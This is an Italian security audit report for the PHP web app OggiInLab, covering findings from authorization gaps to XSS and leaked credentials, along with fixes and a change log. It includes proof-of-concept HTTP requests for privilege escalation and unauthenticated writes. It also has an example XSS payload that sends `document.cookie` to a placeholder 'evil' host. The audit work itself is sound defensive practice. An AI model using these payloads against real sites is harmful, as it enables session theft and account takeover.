# OggiInLab — Report di Revisione Sicurezza

- **Data analisi:** 2026-08-13
- **Perimetro:** codice sorgente `OggiInLab/` (71 file, ~8.500 righe PHP + JS)
- **Stack:** PHP 8.x, MySQL/MariaDB (PDO), Bootstrap 5, JS vanilla
- **Metodo:** code review manuale (authn/authz, CSRF, XSS, SQLi, gestione errori, upload, sessioni, credenziali)

## Riepilogo esecutivo

| Severità | # |
|---|---|
| CRITICA | 3 |
| ALTA    | 3 |
| MEDIA   | 4 |
| BASSA   | 3 |

I punti di forza già presenti nel codice: prepared statements ovunque (nessuna SQLi trovata),
`password_hash`/`password_verify`, `session_regenerate_id(true)` al login, validazione MIME +
re-encoding GD sugli upload, CSRF token (`hash_equals`) nella maggior parte dei form.

I problemi principali sono di **autorizzazione lato server**, **XSS stored su superficie pubblica**,
**endpoint senza autenticazione** e **credenziali reali nel repository**.

---

## CRITICA

### C-1 — Elevation of privilege: `add-admin.php` e `reset_admin.php` senza verifica di ruolo lato server
> ✅ **RISOLTO (2026-08-15)** — Aggiunte verifiche di ruolo Super Admin lato server su tutti gli handler
> sensibili (`toggle_super_admin`, `toggle_is_active`, `delete_admin` in `add-admin.php`; `reset_admin.php`).
> Confronto CSRF portato su `hash_equals()`. Bonus: role-guard Super Admin anche sull'azione `delete` di
> `add_aula.php` (la UI la mostrava già solo ai Super Admin, l'handler non lo verificava).
- **File:** `add-admin.php` (handler `toggle_super_admin`, `toggle_is_active`, `delete_admin`), `assets/utils/reset_admin.php`
- **CWE:** CWE-862 (Missing Authorization), CWE-639
- **Dettaglio:** la UI mostra i pulsanti solo a chi è super admin, ma i handler POST **non verificano
  `$_SESSION['is_super_admin']`**. Qualsiasi utente autenticato può:
  1. `POST add-admin.php` con `toggle_super_admin=1&admin_id=<proprio id>&new_status=1` → **si auto-promuove a Super Admin** (nessun limite, il controllo "minimo 2 super admin" vale solo per la demissione);
  2. `POST add-admin.php` con `delete_admin=1&admin_id=X` → elimina qualsiasi account non super-admin;
  3. `POST add-admin.php` con `toggle_is_active=1&admin_id=X` → disattiva altri admin (DoS);
  4. `POST assets/utils/reset_admin.php` con `admin_id=<qualsiasi>` → **resetta la password di qualsiasi admin, inclusi i Super Admin** → account takeover completa.
  Nota: `assets/utils/toggle-admin-status.php` (endpoint separato) *fa* il controllo super admin — i handler inline di `add-admin.php` sono il percorso reale usato dalla UI.
- **PoC (passo 1, auto-promozione):**
  ```
  POST /add-admin.php
  Content-Type: application/x-www-form-urlencoded
  Cookie: PHPSESSID=<qualsiasi sessione admin valida>

  _token=<token csrf della stessa sessione>&toggle_super_admin=1&admin_id=<mio_id>&new_status=1
  ```
- **Fix consigliato:** guard `is_super_admin` a inizio di ogni handler (toggle_super_admin, toggle_is_active, delete_admin) e in `reset_admin.php`; rimuovere i pulsanti/azioni non autorizzate anche dal DOM; aggiungere log degli attempt negati (già parzialmente presenti).

### C-2 — Scrittura non autenticata: `assets/utils/add_docente.php`
> ✅ **RISOLTO (2026-08-15)** — Aggiunti auth guard (HTTP 401 JSON), CSRF guard (HTTP 403 JSON, `hash_equals`)
> e validazione input (allowlist di lettere/spazi/apostrofi/punteggiatura, max 30 caratteri, coerente con
> `varchar(32)`). I 3 caller JS (`manage_docenti.php`, `manage-project.php`, `assets/js/add-project.js`)
> inviano ora il token `_token`.
- **File:** `assets/utils/add_docente.php`
- **CWE:** CWE-306 (Missing Authentication for Critical Function)
- **Dettaglio:** l'endpoint **non controlla né la sessione né il CSRF**. Chiunque (senza login) può
  `POST /assets/utils/add_docente.php` con `nome` e `cognome` e inserire record nella tabella `docente`
  (inquinamento dati, possibili duplicati massivi, abilitazione di nomi "tutor/esperto" arbitrari
  nei progetti). Viene richiamato da 3 pagine autenticate (`manage_docenti.php`, `manage-project.php`,
  `assets/js/add-project.js`) ma è direttamente raggiungibile.
- **PoC:**
  ```
  POST /assets/utils/add_docente.php  (nessun cookie)
  nome=attacker&cognome=x
  ```
- **Fix consigliato:** aggiungere guard di sessione (`$_SESSION['alogin']`) + validazione CSRF coerente con il resto dell'app + validazione lunghezza/caratteri di nome/cognome.

### C-3 — Stored XSS con superficie PUBBLICA (tabellone `index.php`, dashboard, print)
- **File:**
  - sink: `index.php` (tabellone, `container.innerHTML = ... + ev.title ... + ev.description`), `assets/js/dashboard.js` (`renderTimeline`: `grid.innerHTML = ... '<b>' + ev.title + '</b> ... ev.place + ' - ' + ev.descrizione`), `assets/utils/print_project.php` (`<?php echo $progetto['nomeProgetto']; ?>` non escape), `assets/utils/print_app.php` (`echo $app['descrizione']`)
  - sorgente: `appuntamenti.descrizione` (inseribile da qualsiasi admin via `assets/utils/add-appointment.php`), `progetto.nomeProgetto`/`descProgetto` (`add-project.php`), `docente.cognome`
- **CWE:** CWE-79
- **Dettaglio:** la `descrizione` di un appuntamento è scritta da qualsiasi utente autenticato e
  restituita:
  1. **pubblicamente** dal tabellone di `index.php` (nessun login richiesto per la visualizzazione) via `innerHTML` → script eseguito nel browser di ogni visitatore;
  2. nella dashboard di ogni admin (`dashboard.js`);
  3. in `print_app.php`/`print_project.php` (anch'essi **senza autenticazione**, `echo` non escape).
  Esempio payload come `descrizione`: `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>`.
  aggravante: il cookie di sessione **non è HttpOnly** (vedi M-1) → l'XSS su una pagina admin permette di
  rubare il `PHPSESSID` e impersonare l'utente (es. un super admin di passaggio).
- **Fix consigliato (2 parti):**
  1. *Output:* in `dashboard.js` e tabellone `index.php` rendere il testo con `textContent`/`createElement` (o una funzione `escapeHtml` già usata in `prestiti.js`); in `print_*.php` usare `htmlspecialchars` su tutti gli `echo` di dati DB.
  2. *Input (difesa in profondità):* sanitizzazione/validazione di `descrizione` e nomi progetto in `add-appointment.php`/`add-project.php` (whitelist tag o strip tag + lunghezza max).
  3. Abilitare `session.cookie_httponly` (vedi M-1) per limitare l'impatto residuo.

---

## ALTA

### H-1 — Endpoint di sola lettura SENZA autenticazione (information disclosure)
> ✅ **RISOLTO (2026-08-15)** — Tutti gli 8 endpoint verificano ora `$_SESSION['alogin']`:
> 401 + JSON per gli endpoint JSON, redirect a `index.php` per i print HTML. Anche `print_today.php`.
- **File:** `assets/utils/get_project_details.php`, `get_today_created.php`, `get_modified_appointments.php`, `get_deleted_appointments.php`, `get_done_appointments.php`, `get_project_appointments.php`, `print_app.php`, `print_project.php`
- **CWE:** CWE-601 / CWE-200
- **Dettaglio:** tutti questi endpoint fanno `session_start()` ma **non verificano `$_SESSION['alogin']`**:
  esppongono a chiunque prenotazioni, nomi progetto, descrizioni, nomi docenti, autori, date.
  `get_project_details.php` restituisce anche **messaggi di errore PDO** in chiaro (`$e->getMessage()`).
- **Fix consigliato:** guard di sessione comune (redirect/JSON 401) + risposta generica sugli errori DB.

### H-2 — Credenziali reali nel repository + credenziali di default
- **File:** `includes/config.php` (su disco, con `DB_PASS` reale), storico git (commit `924a6a1` contiene `includes/config.php` con `DB_USER=root`, poi rimosso in `dda92a7` ma **rimane nello storico**), `includes/schema.sql` (admin di default `admin`/`admin`, hash noto), `README.md` (documenta `admin`/`admin`)
- **CWE:** CWE-798, CWE-1393, CWE-547
- **Dettaglio:** chiunque abbia una copia del repo (anche solo lo storico) ha le credenziali DB.
  L'account `admin/admin` in `schema.sql` è un backdoor nota se la password non viene cambiata
  al primo accesso (il README dice di cambiarla, ma nulla lo impone).
- **Fix consigliato:**
  1. Ruotare immediatamente `DB_PASS` e la password di `admin`;
  2. Verificare che `config.php` non venga mai re-commit (è già in `.gitignore`; lo storico va purgato con `git filter-repo` solo se il remote è condiviso pubblico, altrimenti basta rotazione);
  3. In `schema.sql` generare un hash casuale all'installazione oppure verificare al primo login che la password di default sia cambiata.

### H-3 — CSRF assente su tutte le azioni di `add_aula.php`
> ✅ **RISOLTO (2026-08-15)** — Token CSRF obbligatorio su `add`/`edit`/`update`/`delete`
> (hidden input `_token` nei 3 form + verifica `hash_equals()` server-side).
- **File:** `add_aula.php` (0 occorrenze di token CSRF in tutto il file)
- **CWE:** CWE-352
- **Dettaglio:** le azioni `add`, `update`, `delete` (inclusa l'eliminazione di un'aula con i suoi dati)
  sono protette solo dalla sessione: una pagina malevola visitata da un admin autenticato può
  creare/modificare/eliminare aule.
- **Fix consigliato:** aggiungere `_token` + `hash_equals` coerentemente agli altri moduli
  (pattern già esistente in `servizi.php`/`calend_ann.php`).

---

## MEDIA

### M-1 — Cookie di sessione non hardening
> ✅ **RISOLTO (2026-08-15)** — `includes/session.php` applica `session_set_cookie_params`
> (`HttpOnly`, `SameSite=Lax`, `Secure` se HTTPS/X-Forwarded-Proto) e `session.use_strict_mode`.
> Tutte le 36 occorrenze di `session_start()` usano ora il bootstrap comune.
- **File:** tutta l'app (assenza di `session_set_cookie_params`)
- **CWE:** CWE-614
- **Dettaglio:** nessun `HttpOnly` esplicito (il default PHP è off), nessun `Secure`, nessun `SameSite`.
  Il `PHPSESSID` è leggibile via JS → aggravante diretta del C-3 (XSS → session hijacking).
- **Fix:** `session_set_cookie_params(['httponly'=>true,'secure'=>true (su HTTPS),'samesite'=>'Lax'])` in `includes/config.php` (una sola modifica, effetto globale) + `session_regenerate_id` già presente al login.

### M-2 — Header di sicurezza assenti (clickjacking, MIME sniffing)
> ✅ **RISOLTO (2026-08-15)** — `includes/security_headers.php` applica `X-Frame-Options: DENY`,
> `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `Permissions-Policy` e CSP con
> allowlist dei CDN già usati dall'app (jQuery, jsDelivr, Cloudflare, Google Fonts). Iniettata via bootstrap
> di sessione; il Gantt pubblico (`public_today_gantt.php`) la include direttamente senza avviare la sessione.
- **CWE:** CWE-693
- **Dettaglio:** nessun `X-Frame-Options`/`frame-ancestors` (le pagine admin sono incasestrabili →
  clickjacking sui form già CSRF-protetti, ma resta un vettore), nessun `X-Content-Type-Options: nosniff`,
  nessuna CSP.
- **Fix:** header centralizzati in `includes/header.php` (o `.htaccess`): `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, CSP minimale.

### M-3 — Nessun rate-limit / lockout sul login
- **File:** `index.php`
- **CWE:** CWE-307
- **Dettaglio:** tentativi di login illimitati e immediati (nessun CAPTCHA, nessun backoff, nessuna
  lockout). La password `admin/admin` di default amplifica il rischio.
- **Fix:** throttling per IP+username (tabella o file con contatore), lockout temporaneo progressivo, log degli attempt falliti (oggi il fallimento login non viene nemmeno loggato).

### M-4 — Errori/exception leak verso il client
> ✅ **RISOLTO (2026-08-15)** — Nessun `PDOException`/`errorInfo()` viene più mostrato al client:
> dettaglio nei log di server + messaggio generico (`config.php`, endpoint JSON `get_*`, `add_aula.php`,
> `add_docente.php`, `delete-project.php`, pagine admin `manage-project`/`calend_ann`/`add-project`).
> `display_errors` disattivato in 14 file se `APP_DEBUG` non è attivo.
- **File:** `includes/config.php` (`exit("Error: ".$e->getMessage())` su fallimento PDO), `assets/utils/get_project_details.php` (`json_encode(['error'=>$e->getMessage()])`), `add_aula.php` (`"Errore: ".$stmt->errorInfo()[2]`), 15 file con `display_errors=1`
- **CWE:** CWE-209
- **Dettaglio:** host, user, dettagli schema e path di filesystem possono filtrare nelle risposte HTTP.
- **Fix:** `error_reporting(E_ALL)` + `display_errors=0` in produzione (già fatto solo in `dashboard.php` via `APP_DEBUG`), risposte generiche al client, dettagli solo in `error_log`.

---

## BASSA

### L-1 — Confronto CSRF non cost-time in alcuni endpoint
> ✅ **RISOLTO (2026-08-15)** — Tutti i confronti CSRF usano `hash_equals()` con type-check `is_string()`
> (12 file: `add-admin.php`, `reset_admin.php`, `add-appointment.php`, `edit-profile.php`,
> `change-password.php`, `invalida-appointment.php`, `prestiti.php`, `delete-project.php`,
> `orario_lab.php`, `delete-all-deleted.php`, `delete-appointment.php`, `add_aula.php`).
- **File:** `assets/utils/add-appointment.php`, `edit-appointment.php` (`!==`), `delete-appointment.php`, `invalida-appointment.php`, `delete-all-deleted.php`, `assets/utils/prestiti.php`, `orario_lab.php`, `reset_admin.php`, `add-admin.php`
- **CWE:** CWE-208
- **Dettaglio:** `!==` invece di `hash_equals` (teorico timing side-channel; la maggior parte del codice usa già `hash_equals` — incoerenza).
- **Fix:** standardizzare su `hash_equals`.

### L-2 — Assenza di ownership check sulle prenotazioni altrui (design)
- **File:** `assets/utils/edit-appointment.php`, `delete-appointment.php`, `invalida-appointment.php`
- **CWE:** CWE-639
- **Dettaglio:** qualsiasi admin può modificare/eliminare prenotazioni create da altri (probabilmente
  by-design in un'app multi-admin di laboratorio, ma non documentato né loggato in modo distinto).
  L'unico vincolo di ruolo presente è "non-super-admin non cancella prenotazioni passate".
- **Fix (opzionale):** policy esplicita (es. solo autore o super admin può eliminare) + log.

### L-3 — Directory `uploads/` senza protezione esplicita
- **File:** `uploads/` (nessun `.htaccess`)
- **CWE:** CWE-770
- **Dettaglio:** oggi il contenuto è solo immagini/JSON generati dal server (upload validato da finfo+GD, OK),
  ma non c'è nessuna regola che impedisca l'esecuzione di file PHP o l'accesso a `.gantt_data.json` in caso di
  configurazione Apache non standard (`Options -Indexes`, `php_flag engine off`).
- **Fix:** `.htaccess` in `uploads/` (`Require all granted` solo per immagini, `RemoveHandler .php`, deny dotfile).

---

## Positivi confermati (da mantenere)

- SQL: **100% prepared statements**, nessuna interpolazione di input in query.
- Password: `password_hash(PASSWORD_DEFAULT)` / `password_verify` ovunque.
- Login: `session_regenerate_id(true)` contro fixation; redirect post-login.
- Upload `social.php`: whitelist MIME via `finfo` (non solo estensione), limite 500 KB, **re-encoding GD** (neutralizza payload nascosti), nome file `uniqid`.
- CSRF: presente e corretto (`hash_equals`) in `social.php`, `servizi.php`, `calend_ann.php`, `manage_docenti.php`, `add-project.php`, `manage-project.php`, `change-password.php`, `edit-profile.php`, `delete-docente.php`, `toggle-admin-status.php`.
- `cleanup_logs.php`: eseguibili solo da CLI (403 via web) — corretto.
- Output escaping (`htmlspecialchars`) sistematico nelle pagine server-rendered (`active_proj.php`, `prenota-day.php`, `add-admin.php` list, ecc.).

---

## Piano di remediation suggerito (ordine)

| # | Azione | Sforzo | Rischio risolto |
|---|---|---|---|
| 1 | Ruotare credenziali DB + password admin (operativo, immediato) | minuti | H-2 |
| 2 | ✅ RISOLTO — Guard super-admin in `add-admin.php` + `reset_admin.php` | piccolo (3 blocchi) | C-1 |
| 3 | ✅ RISOLTO — Auth+CSRF in `add_docente.php` | piccolo | C-2 |
| 4 | Escape XSS: `dashboard.js`, tabellone `index.php`, `print_*.php` (+ input validation) | medio | C-3 |
| 5 | ✅ RISOLTO — Guard di sessione negli 8 endpoint `get_*`/`print_*` | piccolo (pattern ripetuto) | H-1 |
| 6 | ✅ RISOLTO — CSRF in `add_aula.php` | piccolo | H-3 |
| 7 | ✅ RISOLTO — `session_set_cookie_params` + header di sicurezza centralizzati | piccolo | M-1, M-2 |
| 8 | Rate-limit login + log attempt falliti | medio | M-3 |
| 9 | ✅ RISOLTO — Pulizia errori verso il client + `hash_equals` ovunque | piccolo | M-4, L-1 |
| 10 | `.htaccess` uploads/ + policy ownership prenotazioni | piccolo | L-2, L-3 |

**Complessità:** i punti 2, 3, 5, 6, 7, 9 sono stati implementati e testati il 2026-08-15 (vedi
Log delle modifiche).
I punti 4 (XSS: tocca rendering JS di 3 sink + validazione input), 8 (rate-limit: serve un
meccanismo persistente) e 1 (rotazione credenziali, operativa) restano aperti → candidati naturali
per un implementation plan dedicato.

---

## Log delle modifiche (2026-08-15)

Implementati e testati i punti **2, 3, 5, 6, 7, 9** del piano.

### File nuovi
| File | Scopo |
|---|---|
| `includes/session.php` | Bootstrap sessione comune: `session_set_cookie_params` (HttpOnly, SameSite=Lax, Secure se HTTPS), `use_strict_mode`, include di `security_headers.php` |
| `includes/security_headers.php` | Header: X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, CSP con allowlist CDN |

### File modificati
| File | Modifiche |
|---|---|
| `add-admin.php` | Role-guard Super Admin su `toggle_super_admin`/`toggle_is_active`/`delete_admin`; CSRF in `hash_equals` |
| `assets/utils/reset_admin.php` | Role-guard Super Admin; CSRF in `hash_equals`; redirect corretti (`../../index.php`) |
| `assets/utils/add_docente.php` | Auth guard (401) + CSRF (403) + validazione input nome/cognome; errori DB solo nei log |
| `assets/utils/get_project_details.php`, `get_today_created.php`, `get_modified_appointments.php`, `get_deleted_appointments.php`, `get_done_appointments.php`, `get_project_appointments.php` | Auth guard (401 JSON); errori DB solo nei log |
| `assets/utils/print_app.php`, `print_project.php`, `print_today.php` | Auth guard (redirect a `index.php`); `print_r(errorInfo)` rimosso |
| `add_aula.php` | CSRF su tutte le azioni (hidden input + verifica); role-guard Super Admin su `delete`; errori solo nei log |
| `assets/utils/add-appointment.php`, `edit-appointment.php`, `invalida-appointment.php`, `delete-appointment.php`, `delete-all-deleted.php`, `prestiti.php`, `delete-project.php`, `change-password.php`, `edit-profile.php`, `orario_lab.php`, `manage-project.php`, `calend_ann.php`, `add-project.php` | CSRF in `hash_equals`; errori DB solo nei log |
| `includes/config.php`, `includes/config.example.php` | Errore PDO non più visibile al client (messaggio generico + `error_log`) |
| `assets/utils/public_today_gantt.php` | Include header di sicurezza (senza sessione) |
| `manage_docenti.php`, `manage-project.php`, `assets/js/add-project.js` | Invio del token `_token` a `add_docente.php` |
| 36 file PHP | `session_start();` → `require includes/session.php` (bootstrap comune) |
| 14 file PHP | `display_errors` disattivato se `APP_DEBUG` non attivo |

### Note per il testing
- **Comportamenti attesi verificati con smoke test end-to-end** (PHP built-in server + DB reale, account
temporanei poi eliminati):
  - endpoint `get_*`/`print_*` → 401/redirect se non autenticati, 200 se autenticati;
  - `add_docente.php` → 401 senza sessione, 403 senza token, rifiuto payload XSS;
  - `reset_admin.php` → negato a admin non-super (password invariata), ok per Super Admin;
  - `add_aula.php` → rifiuto senza token; `delete` negato a non-super, ok per Super Admin;
  - pagine admin (13) renderizzano senza warning; cookie `HttpOnly; SameSite=Lax`; header presenti;
  - Gantt pubblico continua a funzionare senza sessione.
- **Attenzione CSP:** la policy include `unsafe-inline`/`unsafe-eval` per gli script inline esistenti;
raddrizzabile solo dopo il refactoring JS (punto 4 del piano).
- **Nota `add_aula.php`:** l'eliminazione di un'aula è ora riservata ai Super Admin (coerente con la UI,
prima era un gap lato server come C-1).
- `display_errors` può essere riattivato in dev con `APP_DEBUG=true` in `includes/config.php`.
